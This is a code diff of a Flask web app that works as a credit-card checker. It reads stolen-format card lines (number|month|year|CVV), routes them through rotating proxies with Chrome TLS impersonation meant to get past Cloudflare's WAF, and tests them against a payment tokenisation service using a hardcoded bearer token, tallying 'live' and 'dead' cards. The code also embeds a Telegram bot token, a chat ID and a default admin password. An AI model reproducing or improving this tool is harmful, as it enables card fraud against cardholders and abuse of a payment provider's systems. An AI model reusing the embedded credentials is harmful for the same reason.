@@ -10,7 +10,6 @@ import base64
 from flask import Flask, request, jsonify, render_template, Response
 from datetime import datetime, timedelta, timezone
 
-# Safe imports for crypto
 try:
     from jose import jwe
     from jose.utils import base64url_encode
@@ -18,7 +17,6 @@ except ImportError:
     jwe = None
     base64url_encode = None
 
-# curl_cffi for TLS fingerprint impersonation to bypass Cloudflare WAF
 from curl_cffi import requests as cffi_requests
 import requests
 import urllib3
@@ -31,7 +29,6 @@ ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "admin123")
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "9138065167:AAHG3HmeQ8a_v7jiuUVqECR-m2W7Xc14fqg")
 TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "6516330870")
 
-# Checker Globals
 checker_queue = queue.Queue()
 checker_stop_event = threading.Event()
 
@@ -84,8 +81,6 @@ def calculate_expiration_utc(amount, unit):
         return int(exp.timestamp())
     except Exception:
         return None
-
-# --- Routes ---
 
 @app.route('/')
 def home():
@@ -235,8 +230,6 @@ def verify_key():
 
     return jsonify({"success": True, "expires_ts": expires_ts})
 
-# --- Web Checker Logic ---
-
 TOKENISATION_BASE = "https://web.uk.littlepay.com"
 INLINE_BEARER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjYXJkaG9sZGVyQXV0aFR5cGUiOiJDVlYiLCJhZGRyZXNzUmVxdWlyZWRGb3JWZXJpZmljYXRpb24iOmZhbHNlLCJwYXJ0aWNpcGFudF9pZCI6ImNvYXN0LXJ0YSIsImV4cCI6MTc5NDU3MjQwMiwibmFtZSI6IkNBUkRfVE9LRU5JU0FUSU9OIn0.Fin7fy3YesZsGCNe-owY9x6-RGK2qGykGSIYhbJDE8k"
 
@@ -269,7 +262,7 @@ def test_proxy(proxy_dict):
     except Exception:
         return False
 
-def check_single_card(card_line, proxy_pool, custom_cookies=""):
+def check_single_card(card_line, proxy_pool):
     parts = card_line.split("|")
     if len(parts) < 3:
         return 2, "ERROR", "Invalid format (cc|mo|yr|cvv)"
@@ -279,16 +272,9 @@ def check_single_card(card_line, proxy_pool, custom_cookies=""):
     expiry = f"{mo}/{yr[-2:]}"
     card_type = "visa" if cc.startswith("4") else "mastercard"
 
-    # Use curl_cffi with browser TLS impersonation to bypass Cloudflare
     session = cffi_requests.Session(impersonate="chrome")
     p_dict = proxy_pool.next() if proxy_pool else None
     proxy_str = p_dict["http"] if p_dict else None
-
-    if custom_cookies:
-        for c in custom_cookies.split(";"):
-            if "=" in c:
-                k, v = c.split("=", 1)
-                session.cookies.set(k.strip(), v.strip(), domain=".littlepay.com")
 
     headers = {
         "Authorization": f"Bearer {INLINE_BEARER_TOKEN}",
@@ -374,7 +360,7 @@ def check_single_card(card_line, proxy_pool, custom_cookies=""):
         err_msg = str(e).encode('ascii', 'ignore').decode('ascii')
         return 2, "ERROR", err_msg or "Exception"
 
-def background_worker(cards, proxies_list, cookies_str=""):
+def background_worker(cards, proxies_list):
     raw_pool = WebProxyPool(proxies_list)
     valid_proxies = []
     total_proxies = len(raw_pool.proxies)
@@ -415,7 +401,7 @@ def background_worker(cards, proxies_list, cookies_str=""):
             counts["error"] += 1
             continue
 
-        code, status, detail = check_single_card(card, proxy_pool, cookies_str)
+        code, status, detail = check_single_card(card, proxy_pool)
         counts["checked"] += 1
         if code == 0: counts["live"] += 1
         elif code == 1: counts["dead"] += 1
@@ -444,12 +430,11 @@ def api_checker_start():
     data = request.get_json() or {}
     cards = [line.strip() for line in data.get('cards', '').split('\n') if line.strip()]
     proxies = [line.strip() for line in data.get('proxies', '').split('\n') if line.strip()]
-    cookies = data.get('cookies', '').strip()
 
     if not cards:
         return jsonify({"success": False, "message": "No cards provided"}), 400
 
-    threading.Thread(target=background_worker, args=(cards, proxies, cookies), daemon=True).start()
+    threading.Thread(target=background_worker, args=(cards, proxies), daemon=True).start()
     return jsonify({"success": True})
 
 @app.route('/api/checker/stop', methods=['POST'])
